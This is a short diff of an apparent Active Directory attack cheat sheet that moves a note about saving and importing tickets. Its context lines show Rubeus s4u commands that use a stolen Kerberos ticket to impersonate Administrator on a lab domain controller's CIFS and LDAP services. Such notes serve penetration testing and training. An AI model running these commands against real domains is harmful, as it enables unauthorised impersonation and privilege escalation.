@@ -744,7 +744,6 @@ Rubeus (optional ```/ptt``` ```/domain``` ```/dc```):
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
 
-You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP
 
 Example:
 
@@ -778,6 +777,8 @@ There is also a possiblity of requesting a TGS for more services than is specifi
 ```
 Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab /dc:dc01.ecorp.lab
 ```
+
+**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP
 
 * * * 
 
